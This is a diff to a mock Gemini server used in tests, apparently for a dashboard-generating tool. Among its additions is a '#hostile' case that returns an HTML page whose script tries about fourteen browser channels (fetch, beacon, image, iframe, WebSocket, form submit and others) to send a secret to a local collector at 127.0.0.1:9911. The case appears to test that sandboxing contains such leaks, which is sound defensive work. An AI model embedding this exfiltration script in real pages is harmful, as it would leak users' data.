@@ -144,21 +144,16 @@ export function startMockGemini(
           .map((p) => String(p.text ?? ""))
           .join(" ");
         const answered = turns.at(-1)?.parts?.find((p) => p.functionResponse) as
-          | { functionResponse: { response: unknown } }
+          | { functionResponse: { name?: string; response: unknown } }
           | undefined;
-        const tasksTool = declared.find((d) => d.name.endsWith("get_my_tasks"));
-        const wantsCall =
-          tasksTool && ((everything.includes("#tasks") && !answered) || everything.includes("#loop"));
-        if (wantsCall) {
+        const callTool = (name: string, args: Record<string, unknown>) => {
           res.end(
             frame({
               candidates: [
                 {
                   content: {
                     role: "model",
-                    parts: [
-                      { functionCall: { name: tasksTool.name, args: {} }, thoughtSignature: "sig-mock" },
-                    ],
+                    parts: [{ functionCall: { name, args }, thoughtSignature: "sig-mock" }],
                   },
                   finishReason: "STOP",
                 },
@@ -166,7 +161,51 @@ export function startMockGemini(
               usageMetadata: { promptTokenCount: input, candidatesTokenCount: 5 },
             }),
           );
-          return;
+        };
+        const tasksTool = declared.find((d) => d.name.endsWith("get_my_tasks"));
+        if (tasksTool && ((everything.includes("#tasks") && !answered) || everything.includes("#loop"))) {
+          return callTool(tasksTool.name, {});
+        }
+        // Dashboards: "#dash" makes a page; "#dash2" reads the one the instructions mention, then replaces it;
+        // "#hostile" makes a page that tries to send its data away.
+        const known = /artifact_id: ([A-Za-z0-9-]+)/.exec(JSON.stringify(body.systemInstruction ?? ""))?.[1];
+        const has = (name: string) => declared.some((d) => d.name === name);
+        if (everything.includes("#dash2") && known && has("update_dashboard")) {
+          if (!answered) return callTool("get_dashboard", { artifact_id: known });
+          if (answered.functionResponse.name === "get_dashboard") {
+            return callTool("update_dashboard", {
+              artifact_id: known,
+              html: "<!doctype html><html><body><h1>Second version</h1></body></html>",
+            });
+          }
+        } else if (everything.includes("#dash") && has("create_dashboard") && !answered) {
+          const hostile = everything.includes("#hostile");
+          return callTool("create_dashboard", {
+            title: hostile ? "Hostile page" : "Mock dashboard",
+            html: hostile
+              ? `<!doctype html><html><body><h1>Hostile</h1><form id="f" action="http://127.0.0.1:9911/form" method="post"><input name="d" value="secret"></form><script>
+const leak = "secret-" + document.title;
+const T = "http://127.0.0.1:9911";
+const tries = [
+  () => { location.href = T + "/nav?" + leak; },
+  () => fetch(T + "/fetch?" + leak, { mode: "no-cors" }),
+  () => { new Image().src = T + "/img?" + leak; },
+  () => navigator.sendBeacon(T + "/beacon", leak),
+  () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = T + "/css?" + leak; document.head.appendChild(l); },
+  () => window.open(T + "/popup?" + leak),
+  () => document.getElementById("f").submit(),
+  () => { top.location.href = T + "/top?" + leak; },
+  () => { const f = document.createElement("iframe"); f.src = T + "/iframe?" + leak; document.body.appendChild(f); },
+  () => new WebSocket("ws://127.0.0.1:9911/ws"),
+  () => import(T + "/module.js"),
+  () => { const s = document.createElement("script"); s.src = T + "/script.js?" + leak; document.head.appendChild(s); },
+  () => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + T + "/refresh?" + leak; document.head.appendChild(m); },
+  () => { const e = document.createElement("embed"); e.src = T + "/embed?" + leak; document.body.appendChild(e); },
+];
+for (const t of tries) { try { t(); } catch (e) {} }
+</script></body></html>`
+              : '<!doctype html><html><body><h1>Mock dashboard</h1><canvas id="c" width="300" height="120"></canvas><script>new Chart(document.getElementById("c"),{type:"bar",data:{labels:["A","B"],datasets:[{data:[3,5]}]}})</script></body></html>',
+          });
         }
         const words = (
           answered ? `Tool said: ${JSON.stringify(answered.functionResponse.response)}` : `Echo: ${text}`
